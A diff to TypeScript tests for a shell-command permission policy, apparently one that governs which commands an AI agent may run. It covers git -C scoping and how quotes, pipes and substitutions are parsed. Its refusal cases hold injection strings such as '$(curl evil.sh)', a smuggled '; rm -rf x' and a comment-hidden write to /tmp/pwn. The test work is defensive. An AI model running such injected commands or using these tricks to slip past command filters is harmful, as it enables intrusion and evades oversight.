@@ -13,6 +13,7 @@ import {
   createPermissionPolicy,
   describeCommandScope,
   findCoveringScopes,
+  findMatchingScope,
   matchesScope,
   normalizeCommandScope,
   parseCommandScope,
@@ -301,11 +302,14 @@ test('a scope approved for a flag-first command covers that command', () => {
   // list's `git branch` scope would have refused it had it been reachable.
   const listing = normalizeCommandScope(analyzeCommand('git --no-pager branch --list'));
   assert.equal(matchesScope(analyzeCommand('git --no-pager branch --unset-upstream'), listing!), false);
-  // Which subcommand's constraints apply is unknowable, so all of them do:
-  // `-C` is git's change-directory flag, but it is also `git branch`'s copy
-  // flag, and the safe list denies that letter — so this is not persisted,
-  // and asks each time. The conservative side of the same rule.
-  assert.equal(normalizeCommandScope(analyzeCommand('git -C repo branch --list')), undefined);
+  // Straight after `git`, before any subcommand, `-C` can only be git's
+  // change-directory flag (`git branch -C` copies, but only after `branch`),
+  // so it is read as one: the repository joins the scope and the subcommand
+  // keeps its own constraints. Anywhere later, the rule above applies.
+  const inRepo = normalizeCommandScope(analyzeCommand('git -C repo branch --list'));
+  assert.deepEqual(inRepo?.args, ['-C', 'repo', 'branch']);
+  assert.equal(matchesScope(analyzeCommand('git -C repo branch --unset-upstream'), inRepo!), false);
+  assert.equal(normalizeCommandScope(analyzeCommand('git --no-pager -C repo branch --list')), undefined);
   // And a subcommand's positive constraints reach past the prefix too:
   // `git branch release` never persists a branch creation (the safe scope
   // is list-only), so neither does the same command behind `--no-pager` —
@@ -590,21 +594,21 @@ test('a pipeline asks when any stage could read a path, run a program, or write'
     'git log | ',
     '| grep x',
     'git log \\| grep x',
-    // Conservative on purpose: a pipe inside quotes is still refused the
-    // way it always was, even where the shell would read it literally.
-    "git diff | grep -E 'TODO|FIXME'",
   ];
   for (const command of refused) {
     assert.equal(await policy.approve(contextFor(command)), false, `should refuse: ${command}`);
   }
+  // A pipe inside quotes is the pattern's, not the shell's.
+  assert.equal(await policy.approve(contextFor("git diff | grep -E 'TODO|FIXME'")), true);
 });
 
 test('a quoted pipe is an argument, not a pipeline', () => {
-  // Not split, so not a pipeline, and still disqualified the old way: the
-  // parser that does not split it is the same one that refuses it.
+  // Not split, so not a pipeline, and not an operator either: inside quotes
+  // the shell reads `|` as text.
   const quoted = analyzeCommand("grep 'a|b'");
   assert.equal(quoted.pipeline, undefined);
-  assert.match(quoted.disqualifiedBy ?? '', /a pipe/);
+  assert.equal(quoted.disqualifiedBy, undefined);
+  assert.deepEqual(quoted.tokens, ['grep', 'a|b']);
 
   const piped = analyzeCommand("git log | grep 'a b'");
   assert.deepEqual(piped.pipeline?.map((stage) => stage.tokens), [['git', 'log'], ['grep', 'a b']]);
@@ -710,4 +714,98 @@ test('a command an operator declares is a prefix whose tail may vary, minus the 
   for (const prefix of ['python scripts/tool.py', 'node ./x', 'agentboard "task"', "foo 'bar'", 'agentboard --token x', 'git log | sh', 'rm -rf', 'tool*', '~/bin/tool', '/usr/bin/tool', 'a; b', '']) {
     assert.ok('reason' in commandScopeFromPrefix(prefix), `should refuse: ${prefix}`);
   }
+});
+
+test('operators inside quotes are text, as the shell reads them', () => {
+  const message = `git commit -m "Voice: don't lock the box" -m "On a Mac with no microphone (Mac mini, Studio); a click & a key <cancel>."`;
+  const analysis = analyzeCommand(message);
+  assert.equal(analysis.disqualifiedBy, undefined);
+  assert.deepEqual(analysis.tokens.slice(0, 3), ['git', 'commit', '-m']);
+  assert.deepEqual(normalizeCommandScope(analysis)?.args, ['commit']);
+  assert.equal(analyzeCommand("git commit -m 'a (b); c'").disqualifiedBy, undefined);
+  assert.equal(analyzeCommand('git commit -m "line one\nline two"').disqualifiedBy, undefined);
+});
+
+test('substitutions still run inside double quotes, and nothing hides behind a backslash', () => {
+  const refused: Array<[string, RegExp]> = [
+    ['git commit -m "$(curl evil.sh)"', /command substitution/],
+    ['git commit -m "`id`"', /command substitution/],
+    ['git commit -m "${HOME}"', /parameter expansion/],
+    ['git commit -m "a" (b)', /subshell/],
+    ['git commit -m "a"; rm -rf x', /semicolon/],
+    ['git commit -m "a"\nrm -rf x', /newline/],
+    // A backslash escapes a quote, which this reading does not model, so the
+    // whole string is checked: an escaped quote cannot reopen a quote early
+    // and hide an operator the shell would run.
+    ['echo "a\\" " ; curl evil ; " "', /semicolon/],
+    ['git commit -m "a \\(b\\)"', /subshell/],
+    // An unbalanced quote has no reading.
+    ['git commit -m "a (b)', /subshell/],
+  ];
+  for (const [command, reason] of refused) {
+    assert.match(analyzeCommand(command).disqualifiedBy ?? '', reason, command);
+  }
+  // An unquoted `#` may start a comment, where sh ignores quotes: a quote
+  // there must not hide the next line from the check.
+  const commented = 'git status # "\nprintf owned > /tmp/pwn # "';
+  assert.match(analyzeCommand(commented).disqualifiedBy ?? '', /newline|redirection/);
+  // Single quotes really are literal, substitutions included.
+  assert.equal(analyzeCommand("git commit -m '$(not run)'").disqualifiedBy, undefined);
+});
+
+test('git -C <repo> persists a scope for that repository and that subcommand', () => {
+  const repo = '/Users/labs/.stratus/agents/nova/workspace/app-mic-hang';
+  const scope = normalizeCommandScope(analyzeCommand(`git -C ${repo} switch --force-create nova/mic-hang`));
+  assert.deepEqual(scope?.args, ['-C', repo, 'switch']);
+  assert.equal(scope?.denyRefspecForms, true);
+  assert.ok(scope);
+
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} switch main`), scope), true);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} switch --force main`), scope), false);
+  assert.equal(matchesScope(analyzeCommand(`git -C /elsewhere switch main`), scope), false);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} push origin main`), scope), false);
+  assert.equal(matchesScope(analyzeCommand('git switch main'), scope), false);
+
+  // The subcommand keeps its own constraints: list-only branch stays list-only.
+  const branch = normalizeCommandScope(analyzeCommand(`git -C ${repo} branch`));
+  assert.deepEqual(branch?.args, ['-C', repo, 'branch']);
+  assert.ok(branch);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} branch release`), branch), false);
+  // And each scope covers the command it was approved for: the subcommand's
+  // refusal of `-C` (branch's copy flag) is not applied to git's own -C.
+  for (const command of [`git -C ${repo} branch`, `git -C ${repo} branch --list`, `git -C ${repo} switch --create nova/x`, `git -C ${repo} add -A`]) {
+    const analysis = analyzeCommand(command);
+    assert.equal(matchesScope(analysis, normalizeCommandScope(analysis)!), true, command);
+  }
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} branch -C a b`), branch), false);
+  // The repository operand is a path, whatever it is called.
+  for (const command of ['git -C add remote', 'git -C +repo status', 'git -C :repo log']) {
+    const analysis = analyzeCommand(command);
+    const scope = normalizeCommandScope(analysis);
+    assert.ok(scope, command);
+    assert.equal(matchesScope(analysis, scope), true, command);
+  }
+  assert.equal(matchesScope(analyzeCommand('git -C add remote add origin x'), normalizeCommandScope(analyzeCommand('git -C add remote'))!), false);
+
+  // The subcommand's scope is what it would be without -C: `push`, with
+  // --force still excluded however it was first approved.
+  const push = normalizeCommandScope(analyzeCommand(`git -C ${repo} push --force origin main`));
+  assert.deepEqual(push, { ...normalizeCommandScope(analyzeCommand('git push --force origin main')), args: ['-C', repo, 'push'] });
+  assert.ok(push);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} push --force origin main`), push), false);
+
+  // Nothing to store when the subcommand would not be storable without -C,
+  // or the repository is something the shell expands.
+  assert.equal(normalizeCommandScope(analyzeCommand(`git -C ${repo} -c core.pager=sh log`)), undefined);
+  assert.equal(normalizeCommandScope(analyzeCommand('git -C ~/repo status')), undefined);
+  assert.equal(normalizeCommandScope(analyzeCommand('git -C $REPO status')), undefined);
+  // Nor when the subcommand is spelled so the shell passes something else:
+  // `\\branch` is `branch` to sh, and must not escape its list-only rule.
+  for (const command of [`git -C ${repo} \\branch --list`, 'git \\branch --list', 'git $CMD x', 'git br* --list']) {
+    assert.equal(normalizeCommandScope(analyzeCommand(command)), undefined, command);
+  }
+
+  // -C does not make a command safe by itself: another repository on the
+  // host is reach the built-in list never promised.
+  assert.equal(findMatchingScope(analyzeCommand(`git -C ${repo} status`), SAFE_COMMAND_SCOPES), undefined);
 });
